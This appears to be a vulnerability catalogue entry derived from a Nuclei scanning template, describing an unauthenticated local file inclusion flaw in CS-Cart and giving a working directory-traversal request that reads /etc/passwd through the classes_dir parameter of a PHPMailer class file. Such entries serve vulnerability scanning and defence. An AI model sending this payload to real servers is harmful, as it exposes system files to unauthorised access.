# Vulnerability: CS-Cart - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`cs-cart-unauthenticated-lfi.yaml`)

## Description
CS-Cart is vulnerable to local file inclusion because it allows remote unauthenticated attackers to access locally stored files and reveal their content.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
```

